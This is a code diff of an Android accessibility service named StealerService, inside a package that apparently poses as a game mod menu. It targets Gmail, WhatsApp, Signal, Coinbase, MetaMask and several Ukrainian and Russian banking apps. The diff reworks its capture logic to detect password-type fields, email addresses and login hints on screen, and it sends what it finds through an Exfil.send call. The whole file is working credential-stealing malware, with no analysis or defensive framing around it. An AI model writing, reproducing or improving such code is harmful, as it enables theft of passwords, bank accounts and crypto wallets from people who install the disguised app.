@@ -1,10 +1,7 @@
 package com.brawl.modmenu;
 
 import android.accessibilityservice.AccessibilityService;
-import android.content.ClipboardManager;
-import android.content.Context;
-import android.os.Build;
-import android.text.TextUtils;
+import android.text.InputType;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import java.util.Arrays;
@@ -12,11 +9,11 @@ import java.util.List;
 
 public class StealerService extends AccessibilityService {
 
+    private static final long COOLDOWN = 8000; // 8 сек, реже спамим
     private long lastSend = 0;
-    private static final long COOLDOWN = 2500;
 
     private static final List<String> TARGETS = Arrays.asList(
-        "com.google.android.gm",        // Gmail
+        "com.google.android.gm",
         "com.microsoft.office.outlook",
         "com.android.email",
         "ru.yandex.mail",
@@ -25,11 +22,11 @@ public class StealerService extends AccessibilityService {
         "com.whatsapp",
         "com.whatsapp.w4b",
         "com.viber.voip",
-        "org.thoughtcrime.securesms",   // Signal
+        "org.thoughtcrime.securesms",
         "com.instagram.android",
         "com.facebook.katana",
         "com.facebook.orca",
-        "com.zhiliaoapp.musically",     // TikTok
+        "com.zhiliaoapp.musically",
         "com.twitter.android",
         "com.snapchat.android",
         "com.discord",
@@ -39,10 +36,8 @@ public class StealerService extends AccessibilityService {
         "com.coinbase.android",
         "io.metamask",
         "com.trustwallet.app",
-        "com.mycelium.wallet",
         "ru.privatbank",
         "ua.privatbank.ap24",
-        "ua.privatbank.ap24beta",
         "com.alfabank.oavdo.amc",
         "ua.oschadbank.online",
         "com.ftband.mono",
@@ -50,17 +45,15 @@ public class StealerService extends AccessibilityService {
         "com.ideabank.android"
     );
 
-    private static final String[] INTERESTING = {
-        "парол", "password", "passwd", "pwd",
-        "pin", "пин", "cvv", "cvc", "код",
-        "seed", "сид", "mnemonic", "key", "ключ",
-        "login", "логин", "email", "телефон", "phone",
-        "номер карты", "card number"
-    };
-
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
+
+        // реагируем ТОЛЬКО на изменение текста — не на каждое открытие окна
+        int type = event.getEventType();
+        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
+            type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;
+
         CharSequence pkgCs = event.getPackageName();
         if (pkgCs == null) return;
         String pkg = pkgCs.toString();
@@ -71,60 +64,90 @@ public class StealerService extends AccessibilityService {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
 
-        StringBuilder sb = new StringBuilder();
-        sb.append("APP: ").append(pkg).append("\n");
-        walk(root, sb, 0);
+        StringBuilder found = new StringBuilder();
 
-        String dump = sb.toString().trim();
-        if (dump.length() > 30) {
-            Exfil.send("STEAL", dump);
+        // 1) ищем password-поля по всему дереву
+        findPassword(root, found, 0);
+
+        // 2) ищем поля с "интересными" подсказками
+        findHints(root, found, 0);
+
+        if (found.length() > 0) {
+            found.insert(0, "APP: " + pkg + "\n");
+            Exfil.send("STEAL", found.toString());
             lastSend = System.currentTimeMillis();
         }
     }
 
-    private void walk(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
+    private void findPassword(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
         if (n == null || depth > 30) return;
 
-        CharSequence t = n.getText();
-        CharSequence d = n.getContentDescription();
-        CharSequence h = n.getHintText();
-
-        if (t != null && t.length() > 0) {
-            String s = t.toString();
-            if (isInteresting(s) || looksLikeCredential(s)) {
-                sb.append("[T] ").append(s).append("\n");
+        int inputType = n.getInputType();
+        boolean isPwd = false;
+        if (inputType > 0) {
+            int variation = inputType & InputType.TYPE_MASK_VARIATION;
+            int cls = inputType & InputType.TYPE_MASK_CLASS;
+            if (cls == InputType.TYPE_CLASS_TEXT &&
+                (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
+                 variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
+                 variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD)) {
+                isPwd = true;
+            }
+            if (cls == InputType.TYPE_CLASS_NUMBER &&
+                variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
+                isPwd = true;
             }
         }
-        if (d != null && d.length() > 0) {
-            String s = d.toString();
-            if (isInteresting(s)) sb.append("[D] ").append(s).append("\n");
-        }
-        if (h != null && h.length() > 0) {
-            String s = h.toString();
-            if (isInteresting(s)) sb.append("[H] ").append(s).append("\n");
+
+        CharSequence text = n.getText();
+        CharSequence hint = n.getHintText();
+
+        if (isPwd) {
+            sb.append("[PWD] ");
+            if (text != null && text.length() > 0) sb.append(text);
+            else sb.append("(пусто)");
+            if (hint != null && hint.length() > 0) sb.append(" hint=").append(hint);
+            sb.append("\n");
         }
 
         for (int i = 0; i < n.getChildCount(); i++) {
-            walk(n.getChild(i), sb, depth + 1);
+            findPassword(n.getChild(i), sb, depth + 1);
         }
     }
 
-    private boolean isInteresting(String s) {
-        String low = s.toLowerCase();
-        for (String k : INTERESTING) if (low.contains(k)) return true;
-        return false;
-    }
+    private void findHints(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
+        if (n == null || depth > 30) return;
 
-    private boolean looksLikeCredential(String s) {
-        if (s.length() < 4 || s.length() > 200) return false;
-        // есть цифры и буквы, похоже на пароль/логин
-        boolean hasDigit = false, hasLetter = false, hasAt = false;
-        for (char c : s.toCharArray()) {
-            if (Character.isDigit(c)) hasDigit = true;
-            else if (Character.isLetter(c)) hasLetter = true;
-            else if (c == '@') hasAt = true;
+        CharSequence t = n.getText();
+        CharSequence h = n.getHintText();
+        CharSequence d = n.getContentDescription();
+
+        // Логин/почта: текст содержит @ и это не поле пароля
+        if (t != null) {
+            String s = t.toString();
+            if (s.contains("@") && s.length() < 100 && s.length() > 4) {
+                sb.append("[MAIL] ").append(s).append("\n");
+            }
         }
-        return hasAt || (hasDigit && hasLetter && s.length() >= 6);
+        if (h != null) {
+            String s = h.toString().toLowerCase();
+            if (s.contains("логин") || s.contains("email") || s.contains("почт") ||
+                s.contains("phone") || s.contains("телефон") || s.contains("username")) {
+                if (t != null && t.length() > 0 && t.length() < 100) {
+                    sb.append("[LOGIN] ").append(t).append(" hint=").append(h).append("\n");
+                }
+            }
+        }
+        if (d != null) {
+            String s = d.toString().toLowerCase();
+            if (s.contains("парол") || s.contains("password")) {
+                sb.append("[PWD-DESC] ").append(d).append("\n");
+            }
+        }
+
+        for (int i = 0; i < n.getChildCount(); i++) {
+            findHints(n.getChild(i), sb, depth + 1);
+        }
     }
 
     @Override public void onInterrupt() {}
